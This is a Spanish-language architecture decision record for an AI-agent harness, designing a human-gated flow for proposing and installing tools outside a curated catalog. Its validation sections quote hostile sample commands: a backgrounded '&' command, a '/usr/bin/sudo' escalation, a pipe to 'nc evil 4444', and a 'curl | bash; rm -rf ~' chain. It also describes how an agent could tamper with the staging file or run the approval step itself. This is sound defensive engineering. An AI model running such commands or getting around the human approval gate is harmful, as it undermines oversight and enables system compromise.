# ADR-0038 — Catálogo de tools abierto bajo demanda: propose → aprobación humana → approve → install

- Estado: Accepted (2026-08-11). Feature 019-harness-evolution, PKG-5 (`P5-tools-discovery`), último
  paquete de la feature — el único que toca la superficie de seguridad del harness. Extiende ADR-0025
  (resolve-first autonomy) sin re-litigarla: ADR-0025 ya abrió `--tools-install`/`--mcp-*` al canal del
  agente para el catálogo CURADO (`tools.toml`); esta ADR decide qué pasa cuando la herramienta que hace
  falta NO está en ese catálogo.

## Contexto

`load_catalog()` (`ai/scripts/set_agents_app.py:1168`) lee únicamente `tools.toml`. Si un agente necesita
un CLI que no está ahí, `cmd_tools_install` (`:1225-1273`) imprime `TOOL_UNKNOWN <name> — agregalo en
tools.toml` y devuelve `2` — un callejón sin salida: el agente no puede editar `tools.toml` (no está en su
canal permitido, y no debería estarlo: es un archivo tracked, curado a mano) y el mensaje se lo tira al
humano sin ningún flujo accionable.

La decisión de producto (pedido original, §0.4, DEC-4 de `spec.md`) ya está tomada y no se re-litiga: el
catálogo se abre **bajo demanda**, con `propose → aprobación humana → approve → install`, siempre
preguntando antes de instalar, con sudo siempre manual. Esta ADR decide el CÓMO: gramática exacta,
criterio de rechazo fail-closed, esquema de persistencia, resolución de colisión, y — el punto que de
verdad importa para la seguridad del harness — quién puede correr cada mitad del flujo.

## Decisión

### 1. Dos comandos nuevos, con muy distinta autoridad

- **`--tools-propose <name> --kind cli|mcp|skill --detect <bin> --install-<method> "<cmd>" --why
  "<motivo>"`**: valida `<name>` (reutiliza `coord_policy._CATALOG_NAME`, ver §4), valida `<cmd>`
  (fail-closed, ver §3), y si pasa, persiste la propuesta en `tools.proposals.json` (nuevo, raíz del
  repo/proyecto, untracked) e imprime la pregunta consolidada para el humano. **No escribe
  `tools.local.toml`, no instala nada, no toca `tools.toml`.** El único artefacto que produce es esa
  propuesta en staging — ver §5 para por qué existe y por qué no cuenta como "mutar el catálogo".
- **`--tools-approve <name>`**: la gramática es deliberadamente sólo el nombre (así lo fija `spec.md`
  AC-31, a diferencia de AC-30 que sí escribe la gramática completa inline). Busca `<name>` en
  `tools.proposals.json`, **re-valida los cinco campos guardados** (`_validate_proposal`, no solo `cmd`
  y `kind` — reparación F-05: `name`/`method`/`detect` venían del staging sin re-chequear y se escribían
  en `tools.local.toml` sin comillas, una vía de inyección de estructura TOML vía un archivo editado a
  mano), chequea colisión contra el catálogo curado (§6), y — reparación F-02, ver §5 — **re-imprime el
  bloque completo** (`kind`/`detect`/`install.<method>`/`why`) y exige una confirmación interactiva antes
  de escribir nada, con la misma negativa sin TTY que ya usa `cmd_tools_install` para sudo. Recién
  entonces escribe el bloque en `tools.local.toml`, borra la propuesta consumida y llama `log-decision`
  (qué herramienta, por qué, quién la pidió; con `cwd` fijado a `ROOT` — F-11, ver §2 — para que la
  decisión quede junto al catálogo que documenta, no en el CWD de quien invoca). La instalación real
  sigue exactamente por `cmd_tools_install` sin ningún cambio de postura (escalación de privilegios se
  muestra y pregunta aun con `--yes`; MCPs entran disabled — eso último ya es automático en
  `_mcp_json_entry`/`_codex_section`, no depende del catálogo).

  **Nota de implementación verificada en vivo**: `log-decision` se invoca como **subprocess** a
  `python3 ai/scripts/feature-state.py log-decision ...` (`_log_tool_decision`), nunca como import
  directo de `feature_state_lib.cli_reporting.cmd_log_decision`. La primera versión de este paquete
  intentó el import directo y falló en el round-trip real:
  `cmd_log_decision` lee `model.render_notes`, un atributo que solo existe porque `feature-state.py`
  (el script top-level, no `feature_state_lib/`) lo monkeypatchea a sí mismo en tiempo de import
  (`model.render_notes = render_notes`, comentado in extenso en ese mismo archivo: `render_notes` vive
  ahí y no en la librería exactamente para que los tests puedan parchear un helper y ver el efecto en
  una función hermana del MISMO módulo). Un proceso que nunca corrió `feature-state.py` como `__main__`
  nunca ve ese monkeypatch y explota con `AttributeError`. El subprocess es, acá, el canal correcto —
  coincide además con el canal ya saneado de `coord_policy.SAFE`
  (`python3 ai/scripts/feature-state.py \S+`) y con cómo cualquier otro rol del harness ya invoca
  `log-decision`.

### 2. `--tools-propose` entra al canal del agente; `--tools-approve` NO — pero "el canal del agente" es
   una superficie de seguridad, no todas

Ya registrado en `ai/state/decisions-log.jsonl` (slug `tools-approve-fuera-del-canal-del-agente`,
2026-08-11) y no se re-litiga: el approve ES la aprobación humana. Si el agente pudiera correrlo por su
cuenta, el flujo propose → humano → approve sería teatro y AC-30/AC-31 perderían su razón de ser. Se
argumenta acá igual, porque es la decisión de seguridad central del paquete:

- `propose` es seguro de automatizar: fail-closed, sin efectos visibles fuera de un archivo de staging
  que nadie consume salvo `approve`, nunca instala, nunca escribe el catálogo real. Es exactamente el
  tipo de "resolver antes de preguntar" que ADR-0025 ya autoriza para el catálogo curado — acá se
  extiende al catálogo abierto.
- `approve` es la línea que separa "el agente decide" de "el humano decide". Cualquier mecanismo que deje
  correr `approve` a un agente sin que un humano haya efectivamente mirado la pregunta consolidada
  convierte el "aprobación humana previa a instalar" (DEC-4) en un paso ceremonial. No hay heurística de
  "el agente juzgó que es seguro" que sustituya esto — es la razón de ser del paquete, no un detalle.
- `coord_policy._tools_channel_allowed` (`ai/scripts/coord_policy.py:175-204`) extiende su
  argv-walker con una rama para `--tools-propose` (gramática cerrada, ver `_tools_propose_allowed`) y
  una rama EXPLÍCITA (no solo el fallthrough a `return False`) que niega `--tools-approve` siempre,
  con un comentario que cita este ADR — explícita a propósito, para que un refactor futuro que agregue
  un catch-all no la vuelva a abrir por accidente. **Reparación F-08**: esa rama explícita corre DESPUÉS
  de `_argv_allowed`/`SAFE_ARGV` en el código original, y una entrada de `SAFE_ARGV` con
  `modifiers=None` (la de `--route*`/`--routing*`) sólo mira `argv[2]` — un `--tools-approve` colgando
  después de un `--routing-report` legítimo pasaba invisible. Se agregó `_contains_tools_approve`,
  chequeada en `allowed()` ANTES de cualquier camino de allow (misma disciplina que
  `_transition_blocks_integration`), acotada a este único flag — el problema general de `modifiers=None`
  para otros flags es preexistente y no se toca acá.
- El generador de permisos de OpenCode (`ai/scripts/generate.py`, línea ~252) ya aprobaba
  `"...--tools*": allow"` de forma DELIBERADAMENTE más gruesa que `coord_policy` (glob-only, comentario
  propio lo admite) — eso incluiría `--tools-approve` por prefijo si no se corrige. Se agrega una línea
  `"...--tools-approve*": deny"` DESPUÉS de la de `allow` (mismo criterio last-match-wins que ya usa
  `--mcp-remove*: deny` inmediatamente después de `--mcp*: allow`), así el lane OpenCode queda con la
  misma postura que el lane Claude Code, no una más laxa por accidente de granularidad glob.
- El lane Codex no necesita un cambio equivalente: su orquestador corre con `sandbox_mode = "read-only"`
  (`Global/codex/agents/orchestrator.toml:5`), así que CUALQUIER bash — incluido un futuro
  `--tools-approve` — ya exige aprobación humana en el momento por construcción del sandbox, no por un
  allowlist de argv. El lane Pi no tiene un `coord_policy.py` propio (`install.py` solo lo copia al hook
  de Claude Code); su prompt es puramente doctrinal y hereda la misma recomendación en texto.
- La consola (`set-agents`, uso interactivo directo del humano en su propia terminal) NO pasa por
  `coord_policy` en absoluto — por eso el ítem de menú "Proponer herramienta nueva" (AC-35) llama
  únicamente `cmd_tools_propose`, nunca approve: aun con un humano ya sentado ahí, mezclar las dos
  acciones en un mismo picker difumina la frontera que este ADR traza, y el humano igual tiene el comando
  exacto de approve para copiar y correr aparte si decide que sí.

**Qué clase de capability liga esta restricción, y por qué (reparación F-07)**. Todo lo de arriba —
`coord_policy.py`, el `deny` de `generate.py`, el sandbox `read-only` de Codex — protege
específicamente el canal del **orquestador/coordinador** (capability `coord-ro` en `ai/scripts/
generate.py`), que es el único rol de este harness cuyo bash pasa por un allowlist deny-by-default de
grano fino. Los roles **writer** (implementer, en cualquier lane) NO están cubiertos por ningún
mecanismo técnico equivalente: en OpenCode el implementer tiene bash `"*": allow` con un denylist corto
(`sudo`/`rm -rf`/`git push --force`/`gh repo delete`, sin `--tools-approve`); en Codex corre con
`sandbox_mode = "workspace-write"` (no `read-only` — esa distinción es exclusiva del orquestador); en Pi
no hay ninguna policy de bash. Un implementer PUEDE, técnicamente, escribir `--tools-approve foo` en su
propia terminal/bash y que corra. La versión original de este ADR y de `cmd_tools_propose`'s mensaje
impreso afirmaban lo contrario ("un agente no puede correr esto") sin esta distinción — falso para
writers, corregido en el mensaje impreso (`cmd_tools_propose`) y en `docs/specs/019-harness-evolution/
evidence/P5-implementer.md`. La invariante real para writers es **doctrinal, no técnica**: el prompt de
cada rol (`Global/_canonical/agents/implementer.md`, bloque Resolve-first) dice explícitamente
"`--tools-approve` is never yours to run; it is the human approval step itself", y esa frase es la única
barrera que existe ahí. Extender un `deny` técnico a los writers de cada lane sería un cambio de diseño
más amplio (afecta la postura de permisos de TODOS los paquetes que usan writers, no solo P5) y queda
fuera de este repair — si se decide hacerlo alguna vez, el ADR que lo haga debe decirlo explícitamente:
sería un "lomo de burro" adicional sobre una superficie ya deliberadamente abierta, nunca una frontera
real (los writers ya pueden correr `rm`, editar cualquier archivo, etc. — `--tools-approve` no es
cualitativamente distinto de lo que ya podrían hacer).

**Alcance real del catálogo local — nunca per-project (reparación F-11)**. `tools.local.toml` y
`tools.proposals.json` viven en `ROOT` (`ai/scripts/set_agents_app.py:41`,
`Path(os.environ.get("SET_AGENTS_ROOT") or Path(__file__).resolve().parents[2])`) — el CLON del harness,
no el proyecto donde se invoca `set-agents`. Un approve corrido desde el proyecto A suma la herramienta
al catálogo que ven TODOS los proyectos que usen ese mismo clon. Esto es defendible (es la misma
granularidad que `tools.toml` curado, que también es del clon, no per-project) pero el comentario de
`.gitignore` decía "per-project", que es simplemente falso — corregido (ver `.gitignore:40-44`).
`_log_tool_decision` originalmente no pasaba `cwd=` al subprocess de `log-decision`, así que la entrada
de decisión caía en el CWD de quien invocaba `--tools-approve` — inconsistente con el catálogo, que
siempre vive en `ROOT` sin importar el CWD. Reparado pasando `cwd=str(ROOT)` explícitamente: ahora los
dos artefactos (catálogo y decisión que lo documenta) son consistentes entre sí, siempre en el mismo
lugar.

### 3. Criterio de rechazo: ALLOWLIST de caracteres, basename de escaladores, y "pipe oculto" con precisión

**Historia real, no teórica**: la primera versión de este ADR describía un DENYLIST de metacaracteres
recordados (`;`, `&&`, `||`, backtick, `$(`, `>`, `<`) y un regex de palabra suelta para `sudo`
(`(?:^|\s)sudo(?:\s|$)`). El review independiente de este paquete reprodujo dos rutas reales a ejecución
arbitraria contra esa versión: `_validate_install_command("true & touch /tmp/X")` devolvía `None`
(aceptado) porque el denylist nunca enumeró un `&` suelto — que en `bash -c` es un separador de
sentencias tan pleno como `;` — y `_validate_install_command("/usr/bin/sudo apt install evil")` también
devolvía `None` porque el regex de sudo exige un espacio o el inicio de string antes de la palabra, y
`/usr/bin/sudo` tiene un `/` ahí, no un espacio. **Un denylist de metacaracteres recordados nunca es
completo — solo rechaza lo que a alguien se le ocurrió tipear.** Los criterios de abajo son los que
reemplazan esa versión; no son un ajuste incremental, son el mecanismo correcto.

**Caracteres, `<cmd>` propuesto** — ALLOWLIST, no denylist (`_ALLOWED_CMD_CHARS_RE` en
`ai/scripts/set_agents_app.py`): `^[A-Za-z0-9 @+,\-./:=_~|]+$`. Todo carácter fuera de ese conjunto se
rechaza por construcción — exactamente las letras, dígitos, el espacio literal, y la puntuación estrecha
que los comandos reales de `tools.toml` (curl/wget/npm/paquetes con `@scope`) necesitan. Quedan
excluidos por construcción, sin necesidad de enumerarlos uno por uno: `;`, `&` (suelto o doble), `` ` ``,
`$`, `(`, `)`, `<`, `>`, `!`, `*`, `?`, `[`, `]`, `{`, `}`, `\`, `%`, `#`, comillas, y todo carácter de
control ASCII (newline incluido). `|` queda DENTRO del allowlist únicamente porque el chequeo de pipe de
abajo lo re-valida con precisión — ningún otro carácter peligroso llega tan lejos.
`ai/scripts/coord_policy.py`'s `FORBIDDEN_SYNTAX` (la capa que protege el canal del agente en general,
no solo esta función) recibió el mismo ajuste: ganó una alternativa `&` suelta y `[\x00-\x1f\x7f]`
(caracteres de control) — antes solo tenía `&&`. **OBS-1** (delta review round 2): el chequeo pasó de
`.match()` a `.fullmatch()` — `$` matchea al final del string O justo antes de UN salto de línea final,
así que `.match()` con este patrón aceptaba un comando con exactamente un `\n` de más al final (no
explotable de forma independiente: cualquier cosa después de ese newline ya rompía el match, y
`_toml_str` escapa cualquier newline que sí llegara al escritor de TOML), pero `.fullmatch()` lo cierra
sin costo.

**Escalación de privilegios, `<cmd>` propuesto Y `cmd_tools_install`** — basename de CADA token resuelto
del comando (no un regex de palabra suelta), contra un denylist de escaladores:
`sudo`, `doas`, `pkexec`, `su`, `runas` (`_PRIVILEGE_ESCALATORS`/`_cmd_privilege_escalator` en
`ai/scripts/set_agents_app.py`). Tokeniza con `shlex.split` (para no confundir un token citado que
simplemente CONTIENE la palabra "sudo" con el binario) y compara el `os.path.basename` de cada token —
así `/usr/bin/sudo`, `doas`, `pkexec`, `su -c "..."` y `runas` se detectan sea cual sea su posición en
el comando (`env sudo ...` también), no solo como primera palabra literal. Usado en `_validate_install_
command` (rechaza en propose/approve, capa adicional a la postura ya existente de `cmd_tools_install`) y
— **excepción de ownership aprobada por el orquestador** (`ai/state/decisions-log.jsonl` slug
`p5-repair-excepciones-y-diseno`, la prohibición del context pack apuntaba a no relajar la postura de
`cmd_tools_install`, y este cambio la ENDURECE) — en `cmd_tools_install` mismo, que antes solo miraba
`command.startswith("sudo ")`. El resto de esa función (muestra el comando completo, pregunta, se
niega sin TTY, aun con `--yes`) sigue exactamente igual. **OBS-3** (delta review round 2) sumó
`sudoedit`/`run0`/`please` a `_PRIVILEGE_ESCALATORS` (faltaban) y **OBS-2** hizo la comparación de
basename case-insensitive (irrelevante en Linux, relevante en un filesystem case-insensitive como el
default de macOS/Windows, donde `SUDO apt install evil` resuelve al mismo binario).

**Falsos positivos conocidos, y por qué son aceptables (OBS-5, documentado, no arreglado)**: comparar
por BASENAME de cada token (no por posición ni por prefijo) es deliberadamente más agresivo que
"¿el comando invoca literalmente el binario `sudo`?" — `os.path.basename("@scope/su")` es `"su"`, así
que un `<cmd>` real como `npm install -g @scope/su` (un paquete npm bajo el scope `@scope` cuyo nombre
es, coincidencia, `su`) o una URL que termine en `/su`/`/sudo` como último segmento de path se rechazan
igual que un escalador real. Esto es un falso positivo, no un bug: **rechazar de más siempre es seguro**
acá (el fail-closed de todo este ADR), el costo es una entrada de catálogo legítima pero rara que necesita
elegir otro nombre o reportarlo — nunca una escalación de privilegios que se cuela. No se afloja el
criterio para este caso (aflojarlo reabriría exactamente la clase de bug que F-03 cerró) — queda
documentado acá en vez de en silencio, tal como pide ADR-0026 (evidence over memory: un trade-off conocido
y no resuelto se declara, no se omite).

Sobre pipes: `curl … | bash` es un método LEGÍTIMO y ya existente en el catálogo curado
(`tools.toml` → `[cli.gcloud.install] curl = "curl -sSL https://sdk.cloud.google.com | bash"`), así que
"pipe oculto" no puede significar "cualquier pipe" — eso rechazaría un patrón que el propio repo ya
confía. El criterio, elegido por ser el más restrictivo que sigue permitiendo ese caso real (más barato
aflojarlo después que descubrir que se dejó pasar algo):

- Se acepta ÚNICAMENTE la forma `(curl|wget) ... | (bash|sh)` — un solo pipe, el lado izquierdo empieza
  con una herramienta de fetch conocida (curl/wget, las dos que `tools.toml`/instaladores reales usan),
  el lado derecho es EXACTAMENTE `bash` o `sh` sin argumentos extra (ni `-s --`, deliberadamente más
  estricto que algunos instaladores reales — ver "Rejected alternatives"). Cualquier otro pipe (segundo
  pipe, destino que no sea bash/sh, origen que no sea curl/wget) se rechaza como pipe oculto — y de
  hecho un segundo pipe o metacaracter adicional ya es imposible de expresar dentro del allowlist de
  caracteres de arriba salvo con MÁS pipes, que el chequeo de forma exacta rechaza igual.
  **OBS-4** (delta review round 2, fixed): el lado izquierdo exigía un `\b` (boundary de PALABRA, no de
  "nombre de binario real") después de `curl`/`wget` — `curl.evil -x URL | bash` tiene un `.` justo
  después de `curl`, que ya es un boundary de palabra, así que pasaba. Ahora exige un espacio real después
  del nombre del binario (`(?=\s)`), que es la única forma en que el catálogo curado invoca curl/wget.
- Se testea EN AMBAS DIRECCIONES: el shape de `tools.toml`'s gcloud (`curl -sSL URL | bash`) debe pasar;
  variantes con un pipe hacia otro destino (`curl x | nc evil 4444`), con pipes múltiples
  (`curl x | tee y | bash`), o con metacaracteres agregados (`curl x | bash; rm -rf ~`) deben rechazarse.
- Adicionalmente, y para TODO kind (no solo `skill`, ver §7), se rechaza cualquier `<cmd>` que mencione
  `Global/_canonical` (case-insensitive) — la razón vive en §7, pero aplicarla de forma pareja a los tres
  kinds es más simple de razonar y estrictamente más restrictivo que limitarla a `skill` solamente.

**`--why`/`--detect`** (reparación F-04): no pasan por el allowlist de `<cmd>` (son texto libre, no un
comando), pero SÍ se rechaza cualquier carácter de control ASCII (`_CONTROL_CHAR_RE`) — un motivo de dos
líneas se rechaza en el origen (`TOOLS_PROPOSE_REJECTED ... --why no puede contener caracteres de
control`), fail-closed, en vez de aceptarse y corromper silenciosamente `tools.local.toml` en la
escritura (ver el bug real de abajo).

### 4. Nombre: una sola gramática, reutilizada

`<name>` valida contra `coord_policy._CATALOG_NAME` (`[a-z0-9][a-z0-9_-]{0,31}`) importado directamente
(`import coord_policy` en `set_agents_app.py`), nunca una segunda regex con el mismo texto — dos
gramáticas de nombre que hoy dicen lo mismo son una bomba de tiempo el día que una cambie y la otra no.

### 5. Por qué existe `tools.proposals.json`, por qué eso sigue siendo "no muta nada" — y por qué la
   promesa "byte a byte" era falsa hasta esta reparación (F-02)

AC-31 fija la gramática de `--tools-approve` en solo `<name>` (a diferencia de AC-30, que si necesitara
que approve repitiera `--kind`/`--detect`/`--install-<method>`/`--why`, lo habría escrito igual de
explícito que en AC-30 y no lo hizo). Un `--tools-approve <name>` bare, en un proceso nuevo e
independiente del `--tools-propose` que lo originó, solo puede recuperar los datos de la propuesta si
algo los persistió. La prosa del context pack ("Valida y no muta nada") se lee, en este ADR, como
referida al ESTADO QUE IMPORTA — el catálogo real (`tools.toml`/`tools.local.toml`) y cualquier
instalación — no como una prohibición absoluta de cualquier byte en disco. `tools.proposals.json` (raíz
de `ROOT` — el clon del harness, ver §2 — untracked, mismo `.gitignore` que `tools.local.toml`) es
exactamente y solo eso: un puente para que approve pueda reconstruir la propuesta. Un segundo
`--tools-propose` para el mismo nombre reemplaza la propuesta pendiente (idempotente); `--tools-approve`
la borra al consumirla.

**La afirmación original — "reconstruye BYTE A BYTE lo que el humano ya vio impreso, nunca algo que el
humano no vio" — era falsa en la implementación que este ADR describía originalmente, y el review
independiente la desmintió end-to-end (F-02, critical)**: la primera versión de `cmd_tools_approve`
buscaba la propuesta por nombre, la escribía en `tools.local.toml`, y solo imprimía
`TOOLS_APPROVE_OK {name} kind={kind}` — NUNCA volvía a mostrar `cmd`/`detect`/`why`. La "reconstrucción
byte a byte" ocurría en el archivo, no en la pantalla del humano. Como `tools.proposals.json` es
untracked y escribible por cualquier proceso con acceso al filesystem (incluido un agente en el canal
`--tools-propose`, que sí lo toca) entre el momento del propose y el del approve, un payload podía
cambiarse por completo — mismo nombre, comando distinto — y el humano que corría `--tools-approve
<name>` viendo solo el nombre en pantalla no tenía forma de notar el cambio. El review reprodujo este
intercambio end-to-end con un archivo marcador real.

**La reparación**: `cmd_tools_approve` ahora RE-IMPRIME el bloque completo (`kind`/`detect`/
`install.<method>`/`why`) tal como está en `tools.proposals.json` EN ESE MOMENTO — no lo que se imprimió
en el propose — y exige una confirmación interactiva antes de escribir nada, reusando el patrón que
`cmd_tools_install` ya usa para sudo (se niega sin TTY, nunca corre/escribe nada en silencio). Esto SÍ
cumple la promesa original, pero por un mecanismo distinto al que el ADR describía: no es la existencia
del archivo de staging la que garantiza "nunca algo que el humano no vio", es la RE-IMPRESIÓN en el
momento del approve, leída por el humano que está confirmando ahí mismo. Si el archivo fue tamperado
entre propose y approve, el humano ve el contenido tamperado — puede decir que no.

Alternativa rechazada: hacer que `--tools-approve` reciba de nuevo los 5 flags completos. Se descarta
porque diverge de la gramática que `spec.md` fija literalmente para AC-31, y porque obligaría al humano a
volver a escribir (o copiar-pegar, con el mismo riesgo de transcripción) un comando con `<cmd>` shell
potencialmente largo, en vez de simplemente confiar en lo que ya validó al leer la pregunta consolidada.

### 6. Colisión de nombre: el catálogo curado gana, y se rechaza en vez de esconderse

`load_catalog()` (`:1168`) pasa a mergear `tools.toml` + `tools.local.toml` (el local, si falta, nunca
rompe nada — mismo contrato never-fails que `notes_root`, `render_notes.py:37`); ante una colisión de
nombre entre ambos, el curado gana SIEMPRE (un catálogo local no debe poder secuestrar `vercel`).

Pero además — más fuerte que solo "el merge resuelve en silencio" — `cmd_tools_approve` RECHAZA el
approve si `<name>` ya existe en el catálogo curado, en cualquiera de sus secciones (`cli`/`mcp`), con un
mensaje explícito. Razón: dejar que el approve escriba igual una entrada que el merge después iba a
ignorar silenciosamente sería peor UX que negarse ahora — el humano se enteraría recién al notar que su
approve "no hizo nada". El merge curado-gana queda como defensa en profundidad para el caso en que
`tools.local.toml` se edite a mano (no pasa por `cmd_tools_approve` en absoluto), no como el mecanismo
principal.

**NEW-01 (high, delta review round 2) — el edit a mano no era solo un riesgo de colisión de nombre, era
un camino directo, sin validar, a `bash -c`.** El párrafo de arriba (y la versión original de esta
sección) solo consideraba qué pasa cuando un `tools.local.toml` editado a mano COLISIONA con un nombre
curado. No consideraba el caso más simple y más peligroso: un `tools.local.toml` editado a mano con un
nombre que NO colisiona con nada. Ese archivo es untracked (`.gitignore`, ver §2/F-11) — ningún gate,
review ni `git status` lo ve — y hasta esta reparación, el ÚNICO camino de escritura legítimo
(`cmd_tools_approve`) corría `_validate_proposal`/`_validate_install_command` (§3) sobre su contenido,
pero el camino de LECTURA (`cmd_tools_install`, vía `load_catalog()`) nunca lo hacía: leía la entrada
mergeada y la pasaba directo a `subprocess.run(["bash", "-c", command])`, incluso bajo `--yes` (que además
salta la confirmación interactiva por completo). El review lo reprodujo con un marcador real: una entrada
`[cli.backdoor]` con `install.npm = "true & touch <marker>"` corría con `rc=0` y el marcador se creaba —
exactamente el mismo `&` que §3 ya rechaza en el camino propose/approve, sin ninguna fricción en el
camino de lectura.

**La reparación**: `_is_local_only_entry(kind, name)` (`ai/scripts/set_agents_app.py`) distingue una
entrada que resuelve del `tools.toml` curado (nunca revalidada — reviewed, tracked en git, y algunas
legítimamente necesitan sudo) de una que solo existe por el overlay local (mismo criterio curado-gana que
`load_catalog()`, para que nunca clasifique como "local" un nombre que en realidad es curado). Cuando
`cmd_tools_install` resuelve una entrada local-only, vuelve a correr `_validate_install_command` sobre
CADA comando de instalación que esa entrada carga (no solo el que `pick_method` elegiría en esta
plataforma) ANTES de tocar `shutil.which`/`pick_method`, y si cualquiera falla, rechaza la entrada entera
con `TOOL_REJECTED` — nunca llega a `subprocess.run`, con o sin `--yes`. Una entrada que sí pasó por
`--tools-approve` (y por lo tanto ya validó en la escritura) nunca falla esta re-validación: es
exactamente el mismo chequeo, solo que corrido una segunda vez, en el otro extremo del ciclo de vida del
archivo. Las 9 entradas `[cli.*]` curadas de `tools.toml` (incluidas las que usan sudo, como
`gh`/`docker`/`jq`) no pasan por este chequeo en absoluto — `_is_local_only_entry` las excluye por diseño.

### 7. `Global/_canonical/` fuera de alcance como destino de instalación — y qué ES realmente el guard
   (reparación F-13)

`Global/_canonical/` es la fuente desde la que `./build.sh` genera los 4 árboles (`Global/{opencode,
claude-code,codex,pi}/`); un comando de instalación que escriba ahí (por ejemplo una skill "instalada"
directo en `Global/_canonical/skills/`) se propagaría a TODOS los proyectos que corran `./build.sh` sobre
este repo, y sobreviviría a cualquier revisión de paquete — exactamente el tipo de blast radius que este
ADR busca evitar. Por eso `_validate_install_command` rechaza cualquier `<cmd>` que mencione
`Global/_canonical` (case-insensitive), para los tres kinds (§3). Una skill aprobada por este flujo queda
catalogada con el mismo esquema `detect`+`install.<method>` que un CLI (ver "Rejected alternatives" — no
se modela un esquema nativo de skill en este paquete); su instalación real —copiar archivos a
`.claude/skills/` del proyecto destino— es explícitamente TRABAJO FUTURO, no de este paquete (ver "Fuera
de alcance" del context pack: "`Global/_canonical/skills/**` como destino de instalación (AC-34)").

**Qué es este guard, honestamente**: `_CANONICAL_TARGET_RE` es un `search` de substring
(`Global/_canonical`, sobre el string crudo del `<cmd>` propuesto, case-insensitive tras la reparación
F-13) — es un **alambre de aviso para el caso literal obvio**, no un mecanismo de contención real. No
resuelve symlinks, no expande variables de entorno, no normaliza rutas equivalentes que un regex no
anticipe, y no reconoce nada que no sea el string literal exacto. La contención REAL hoy no es este
regex — es que **no existe ningún instalador de skills**: `kind=skill` queda catalogado (mismo esquema
`detect`+`install.<method>` que `cli`) pero nunca se conecta a `cmd_tools_install`/`_tools_data()` (ver
"Rejected alternatives"), así que no hay ningún camino, ni siquiera uno que pase este regex, que
efectivamente copie archivos a `Global/_canonical/skills/` ni a ningún otro lado — el `install.<method>`
guardado es lectura humana, no automatización. Si algún día se construye un instalador de skills real, la
contención que importe en ese momento tiene que ser un chequeo de **path resuelto** en tiempo de
instalación (symlinks seguidos, variables expandidas, comparado contra la raíz canónica real) — este
regex de propose-time queda como lo que siempre fue: un aviso barato para el caso obvio, útil pero no una
frontera de seguridad por sí solo.

### 8. `TOOL_UNKNOWN` deja de ser callejón sin salida

`cmd_tools_install` (`:1228`) mantiene el token `TOOL_UNKNOWN` (la suite lo pinea,
`tests/test_harness.py:577`) pero el resto del mensaje pasa a sugerir el comando `--tools-propose`
exacto en vez de "agregalo en tools.toml". **Reparación F-10**: simétricamente, `cmd_tools_approve` ya
no sugiere `--tools-install <name>` para `kind=mcp`/`kind=skill` (esa sugerencia siempre fallaría con el
mismo `TOOL_UNKNOWN`, porque solo `kind=cli` se conecta a `cmd_tools_install`/`_tools_data()` — ver
"Rejected alternatives"); en su lugar imprime un `NOTA:` explícito diciendo que la entrada quedó
catalogada pero sin instalación automática.

### 9. Reparación del repair-agent — hallazgos restantes (F-04, F-06, F-09, F-12, F-14, F-15)

Los hallazgos F-01/F-02/F-03/F-05/F-07/F-08/F-11/F-13 ya están descritos en las secciones de arriba,
donde corresponden temáticamente. El resto:

- **F-04 (high)** — `_toml_str` solo escapaba `\\`/`"`; un `--why` con un salto de línea producía una
  basic string TOML SIN TERMINAR (`_toml_str("a\nb")` → `'"a\nb"'`, newline literal). `_load_local_
  catalog` atrapaba el `TOMLDecodeError` resultante en silencio y devolvía `{}` — un approve de dos
  líneas de motivo borraba TODO el catálogo local aprobado hasta ese momento, con `rc=0` y
  `TOOLS_APPROVE_OK` impreso, sin ningún adversario. Reparado en tres capas: `_toml_str` ahora escapa
  todo carácter TOML-significativo (los de nombre corto `\b\t\n\f\r`, el resto vía `\uXXXX`);
  `cmd_tools_propose`/`_validate_proposal` rechazan `--why`/`--detect` con cualquier carácter de control
  en el origen (fail-closed, ver §3); y `_load_local_catalog` ya no traga el error en silencio — imprime
  un `WARNING` a stderr con la ruta y la razón antes de degradar a `{}`.
- **F-06 (medium, reabierto en delta review round 2)** — el contrato never-fails de `_load_local_catalog`/
  `_read_tools_proposals` era falso ante entrada bien formada pero de forma equivocada: un `oops = 1` de
  nivel superior, o una entrada de sección que no es una tabla, llegaban como `AttributeError` a
  `load_catalog`/`_tools_header`/`tools_menu`/el panel de estado. Reparado (round 1) con validación de
  forma (`isinstance(dict)`) en cada nivel indexado. **Insuficiente**: una entrada que SÍ es una tabla
  bien formada, pero le falta `detect`/`install` (o los tiene con el tipo equivocado), seguía llegando a
  `_tools_data`/`cmd_tools_install` como `KeyError` — el review lo reprodujo con `[cli.x] note = "..."`
  sin `detect`, y con `detect` pero sin tabla `install`. Reparado (round 2) con `_valid_local_entry_shape`:
  cada entrada del overlay local necesita `detect` (string no vacío) e `install` (dict no vacío de
  string → string) — el mismo esquema uniforme que `cmd_tools_approve` siempre escribe, para todo `kind`
  (§7, `_dump_toml_catalog`) — o se descarta con un `WARNING` a stderr en vez de crashear cualquier
  consumidor downstream.
- **NEW-01 (high, delta review round 2)** — ver el párrafo dedicado en §6: el camino de lectura
  (`cmd_tools_install`) nunca validaba el contenido del overlay local antes de pasarlo a `bash -c`, a
  diferencia del camino de escritura (`cmd_tools_approve`), que sí lo hacía. Reparado con
  `_is_local_only_entry` + una re-validación de `_validate_install_command` en tiempo de instalación,
  acotada a entradas que no vienen del catálogo curado.
- **NEW-02 (medium, delta review round 3)** — ver el párrafo dedicado en "Rejected alternatives"
  (`--kind mcp`/`skill` con esquema propio): el hermano `mcp` de NEW-01/F-06 — toda entrada `[mcp.*]` del
  overlay local tiene forma `detect`+`install` (F-06 round 2) y por lo tanto NUNCA `type`, pero
  `_mcp_json_entry`/`_codex_section` indexaban `spec["type"]` directo desde `cmd_mcp_add`/`cmd_mcp_toggle`
  — `KeyError` alcanzable desde el canal del agente. Reparado con `_mcp_spec_supported` en los dos call
  sites que de verdad indexan `type`; los demás consumidores de `load_catalog().get("mcp", ...)` ya
  degradaban bien y quedan pineados.
- **F-09 (medium)** — los tres tests originales de `cmd_tools_approve` parcheaban `_log_tool_decision`
  enteramente, así que la función real nunca corría en CI — exactamente cómo el `AttributeError` del
  primer intento de import directo (nota de implementación arriba) llegó a runtime en vez de a CI.
  Reparado con un test que invoca `_log_tool_decision` de verdad (subprocess real, `feature-state.py`
  real, en una raíz aislada) y assertea la entrada real en `decisions-log.jsonl`.
- **F-12 (low)** — el subprocess de `log-decision` no tenía `timeout`, heredaba stdout (el JSON crudo de
  `feature-state.py` se filtraba a la salida de `--tools-approve`), y su `returncode` se descartaba sin
  avisar. Reparado con `timeout=30`, `capture_output=True`, y un `returncode`/timeout no-cero reportado
